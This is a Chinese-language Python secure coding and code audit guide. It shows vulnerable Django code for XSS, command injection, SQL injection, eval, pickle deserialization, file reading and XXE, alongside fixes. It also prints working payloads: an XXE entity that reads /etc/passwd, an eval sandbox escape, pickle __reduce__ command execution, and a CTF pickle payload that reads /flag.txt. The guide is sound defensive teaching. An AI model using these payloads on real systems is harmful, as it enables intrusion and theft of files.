# 安全编码规范-代码审计

## 一、【安全开发】python安全编码规范

### python语言安全

本身要注意的有，一些危险函数,危险模块的调用，主要是系统调用。这个如果调用一定要对输入输出做好过滤，以下是代码中各种导致进行系统调用的方式。尽量避免。

* 避免各种情况导致系统调用
* 谨慎使用Eval
* 数据序列化

### Web编程

对应Web编程中安全概念在python web框架中的实现。url跳转，目录遍历，任意文件读取也需要考虑在内。针对不同的框架也需要。

#### Flask 安全

* 使用Flask-Security
* 直接生成 HTML 而不通过使用Jinja2
* 不要在用户提交的数据上调用Markup
* 使用 Content-Disposition: attachment 标头去避免上传html文件
* 防止CSRF，flask本身没有实现该功能

#### Django 安全

* 关闭DEBUG模式
* 关闭swagger调试
* 妥善保存SECRET\_KEY
* 使用SecurityMiddleware
* 设置SECURE\_HSTS\_SECONDS开启HSTS头，强制HTTPS访问
* 设置SECURE\_CONTENT\_TYPE\_NOSNIFF输出nosniff头，防止类型混淆类漏洞
* 设置SECURE\_BROWSER\_XSS\_FILTER输出x-xss-protection头，让浏览器强制开启XSS过滤
* 设置SECURE\_SSL\_REDIRECT让HTTP的请求强制跳转到HTTPS
* 设置SESSION\_COOKIE\_SECURE使Cookie为Secure，不允许在HTTP中传输
* 设置CSRF\_COOKIE\_SECURE使CSRF Token Cookie设置为Secure，不允许在HTTP中传输
* 设置CSRF\_COOKIE\_HTTPONLY为HTTP ONLY
* 设置X\_FRAME\_OPTIONS返回X-FRAME-OPTIONS: DENY头，以防止被其他页面作为框架加载导致ClickJacking
* 部署前运行安全性检测 django-admin.py checksecure --settings=production\_settings

### 审计工具

安装使用方式较为简单，所以不做介绍。

* AST-based static Analyzer: Bandit
* Static Analyzer: PYT

## 二、python代码审计 <a id="1-&#x524D;&#x8A00;"></a>

## 1 前言 <a id="1-&#x524D;&#x8A00;"></a>

现在一般的web开发框架安全已经做的挺好的了，比如大家常用的django，但是一些不规范的开发方式还是会导致一些常用的安全问题，下面就针对这些常用问题做一些总结。代码审计准备部分见《php代码审计》，这篇文档主要讲述各种常用错误场景，基本上都是咱们自己的开发人员犯的错误，敏感信息已经去除。

## 2 XSS <a id="2-XSS"></a>

未对输入和输出做过滤，场景：

```python
def xss_test(request):    
name = request.GET['name']    
return HttpResponse('hello %s' %(name))
```

在代码中一搜，发现有大量地方使用，比较正确的使用方式如下：

```python
def xss_test(request):
    name = request.GET['name']
    #return HttpResponse('hello %s' %(name))
    return render_to_response('hello.html', {'name':name})
```

更好的就是对输入做限制，比如说一个正则范围，输出使用正确的api或者做好过滤。

## 3 CSRF <a id="3-CSRF"></a>

对系统中一些重要的操作要做CSRF防护，比如登录，关机，扫描等。django 提供CSRF中间件`django.middleware.csrf.CsrfViewMiddleware`,写入到settings.py的中间件即可。

```python
def my_view(request):
    c = {}
    c.update(csrf(request))
    # ... view code here
    return render_to_response("a_template.html", c)
```

## 4 命令注入 <a id="4-&#x547D;&#x4EE4;&#x6CE8;&#x5165;"></a>

审计代码过程中发现了一些编写代码的不好的习惯，体现最严重的就是在命令注入方面，本来python自身的一些函数库就能完成的功能，偏偏要调用os.system来通过shell 命令执行来完成，老实说最烦这种写代码的啦。下面举个简单的例子：

```python
def myserve(request, filename, dirname):
    re = serve(request=request,path=filename,document_root=dirname,show_indexes=True)
    filestr='authExport.dat' 
    re['Content-Disposition'] = 'attachment; filename="' + urlquote(filestr) +'"'fullname=os.path.join(dirname,filename)
    os.system('sudo rm -f %s'%fullname)
    return re
```

很显然这段代码是存在问题的，因为fullname是用户可控的。正确的做法是不使用os.system接口，改成python自有的库函数，这样就能避免命令注入。python的三种删除文件方式：  
（1）shutil.rmtree 删除一个文件夹及所有文件  
（2）os.rmdir 删除一个空目录  
（3）os.remove，unlink 删除一个文件

使用了上述接口之后还得注意不能穿越目录，不然整个系统都有可能被删除了。常见的存在命令执行风险的函数如下：

```text
os.system,os.popen,os.spaw*,os.exec*,os.open,os.popen*,commands.call,commands.getoutput,Popen*
```

推荐使用subprocess模块，同时确保shell=True未设置，否则也是存在注入风险的。

## 5 sql注入 <a id="5-sql&#x6CE8;&#x5165;"></a>

如果是使用django的api去操作数据库就应该不会有sql注入了，但是因为一些其他原因使用了拼接sql，就会有sql注入风险。下面贴一个有注入风险的例子：

```python
def getUsers(user_id=None):
    conn = psycopg2.connect("dbname='××' user='××' host='' password=''")
    cur = conn.cursor(cursor_factory=psycopg2.extras.DictCursor)
    if user_id==None:
        str = 'select distinct * from auth_user'
    else:
        str='select distinct * from auth_user where id=%s'%user_id
    res = cur.execute(str)
    res = cur.fetchall()
    conn.close()
    return res
```  
像这种sql拼接就有sql注入问题，正常情况下应该使用django的数据库api，如果实在有这方面的需求，可以按照如下方式写：  
```python
def user_contacts(request):
  user = request.GET['username']
  sql = "SELECT * FROM user_contacts WHERE username = %s"
  cursor = connection.cursor()
  cursor.execute(sql, [user])
# do something with the results
  results = cursor.fetchone()   #or  results = cursor.fetchall()
  cursor.close()
```  
直接拼接的是万万不可的，如果采用ModelInstance.objects.raw(sql,[]),或者connection.objects.execute(sql,[]) ,通过列表传进去的参数是没有注入风险的，因为django会有处理。
# 6 代码执行  
一般是由于eval和pickle.loads的滥用造成的，特别是eval，大家都没有意识到这方面的问题。下面举个代码中的例子：
```python
@login_required
@permission_required("accounts.newTask_assess")
def targetLogin(request):
    req = simplejson.loads(request.POST['loginarray'])
    req=unicode(req).encode("utf-8")
    loginarray=eval(req)
    ip=_e(request,'ipList')
    #targets=base64.b64decode(targets)
    (iplist1,iplist2)=getIPTwoList(ip)
    iplist1=list(set(iplist1))
    iplist2=list(set(iplist2))
    loginlist=[]
    delobjs=[]
    holdobjs=[]
```

这一段代码就是就是因为eval的参数不可控，导致任意代码执行，正确的做法就是literal.eval接口。再取个pickle.loads的例子：  

```python
>>> import cPickle
>>> cPickle.loads("cos\nsystem\n(S'uname -a'\ntR.")
Linux RCM-RSAS-V6-Dev 3.9.0-aurora #4 SMP PREEMPT Fri Jun 7 14:50:52 CST 2013 i686 Intel(R) Core(TM) i7-2600 CPU @ 3.40GHz GenuineIntel GNU/Linux
0
```

## 7 文件操作 <a id="7-&#x6587;&#x4EF6;&#x64CD;&#x4F5C;"></a>

文件操作主要包含任意文件下载，删除，写入，覆盖等，如果能达到写入的目的时基本上就能写一个webshell了。下面举个任意文件下载的例子：

```python
@login_required
@permission_required("accounts.newTask_assess")
def exportLoginCheck(request,filename):
    if re.match(r“*.lic”，filename):
        fullname = filename
    else:
        fullname = "/tmp/test.lic"
    print fullname
    return HttpResponse(fullname)
```

这段代码就存在着任意.lic文件下载的问题，没有做好限制目录穿越，同理

## 8 文件上传 <a id="8-&#x6587;&#x4EF6;&#x4E0A;&#x4F20;"></a>

### 8.1 任意文件上传 <a id="8-1-&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;"></a>

这里主要是未限制文件大小，可能导致ddos，未限制文件后缀，导致任意文件上传，未给文件重命名，可能导致目录穿越，文件覆盖等问题。

### 8.2 xml，excel等上传 <a id="8-2-xml&#xFF0C;excel&#x7B49;&#x4E0A;&#x4F20;"></a>

在我们的产品中经常用到xml来保存一些配置文件，同时也支持xml文件的导出导入，这样在libxml2.9以下就可能导致xxe漏洞。就拿lxml来说吧：

```markup
root@kali:~/python# cat test.xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xdsec [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>
    <node id="11" name="bb" net="192.168.0.2-192.168.0.37" ltd="" gid="" />test&xxe;</root>
>>> from lxml import etree
>>> tree1 = etree.parse('test.xml')
>>> print etree.tostring(tree1.getroot())
<root>
    <node id="11" name="bb" net="192.168.0.2-192.168.0.37" ltd="" gid=""/>testroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
```

这是因为在lxml中默认采用的XMLParser导致的：

```markup
class XMLParser(_FeedParser)
|  XMLParser(self, encoding=None, attribute_defaults=False, dtd_validation=False, load_dtd=False, no_network=True, ns_clean=False, recover=False, XMLSchema schema=None, remove_blank_text=False, resolve_entities=True, remove_comments=False, remove_pis=False, strip_cdata=True, target=None, compact=True)
```

关注其中两个关键参数，其中resolve\_entities=True,no\_network=True,其中resolve\_entities=True会导致解析实体，no\_network会为True就导致了该利用条件比较有效，会导致一些ssrf问题，不能将数据带出。在python中xml.dom.minidom,xml.etree.ElementTree不受影响

## 9 不安全的封装 <a id="9-&#x4E0D;&#x5B89;&#x5168;&#x7684;&#x5C01;&#x88C5;"></a>

### 9.1 eval 封装不彻底 <a id="9-1-eval-&#x5C01;&#x88C5;&#x4E0D;&#x5F7B;&#x5E95;"></a>

仅仅是将`__builtings__`置为空，如下方式即可绕过,可参见[bug84179](http://xxlegend.com/2015/07/30/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E5%92%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

```python
>>> s2="""
    [x for x in ().__class__.__bases__[0].__subclasses__()
       if x.__name__ == "zipimporter"][0](
         "/home/xxlegend/eval_test/configobj-4.4.0-py2.5.egg").load_module(
         "configobj").os.system("uname")
    """
>>> eval(s2,{'__builtins__':{}})
Linux
0
```

### 9.2 执行命令接口封装不彻底 <a id="9-2-&#x6267;&#x884C;&#x547D;&#x4EE4;&#x63A5;&#x53E3;&#x5C01;&#x88C5;&#x4E0D;&#x5F7B;&#x5E95;"></a>

在底层封装函数没有过滤shell元字符，仅仅是限定一些命令，但是其参数未做控制，可参见[bug86011](http://xxlegend.com/2015/07/30/Python%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E5%92%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

## 10 反序列化

`python`中序列化一般有两种方式：`pickle`模块和`json`模块，前者是`python`特有的格式，后者是`json`通用的格式。

以下均显示为`python2`版本序列化输出结果，`python3`的`pickle.dumps`结果与`python2`不一样。

**pickle**

```python
import pickle

dict = {"name": 'zjun', "age": 19}
a = pickle.dumps(dict)
print(a, type(a))
b = pickle.loads(a)
print(b, type(b))
```

输出：

```yaml
("(dp0\nS'age'\np1\nI19\nsS'name'\np2\nS'zjun'\np3\ns.", <type 'str'>)
({'age': 19, 'name': 'zjun'}, <type 'dict'>)
```

**json**

```python
import json
dict = {"name": 'zjun', "age": 19}
a = json.dumps(dict, indent=4)
print(a, type(a))
b = json.loads(a)
print(b, type(b))
```

其中`indent=4`起到一个数据格式化输出的效果，当数据多了就显得更为直观，输出：

```javascript
{
    "name": "zjun",
    "age": 19
} <class 'str'>
{'name': 'zjun', 'age': 19} <class 'dict'>
```

再看看一个`pickle`模块导致的安全问题

```python
import pickle
import os

class obj(object):
    def __reduce__(self):
        a = 'whoami'
        return (os.system, (a, ))

r = pickle.dumps(obj())
print(r)
pickle.loads(r)
```

通过构造`__reduce__`可达到命令执行的目的，详见：[Python魔法方法指南](https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html)

![](https://xzfile.aliyuncs.com/media/upload/picture/20200809201530-046eea10-da3a-1.png)

先输出`obj`对象的序列化结果，再将其反序列化，输出

```text
cposix
system
p0
(S'whoami'
p1
tp2
Rp3
.
zjun
```

成功执行了`whoami`命令。

**实例：CISCN2019 华北赛区 Day1 Web2 ikun**

[CISCN2019 华北赛区 Day1 Web2 ikun](https://www.zjun.info/2019/ikun.html)，前面的细节讲得很清楚了，这里接着看反序列化的考点。

![](https://xzfile.aliyuncs.com/media/upload/picture/20200809201533-0664f3aa-da3a-1.png)

第`19`行处直接接收`become`经`url`解码与其反序列化的内容，存在反序列化漏洞，构造`payload`读取`flag.txt`文件：

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print(a)
```

```text
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
```

将生成的`payload`传给`become`即可。

## 总结 <a id="10-&#x603B;&#x7ED3;"></a>

一切输入都是不可靠的，做好严格过滤。

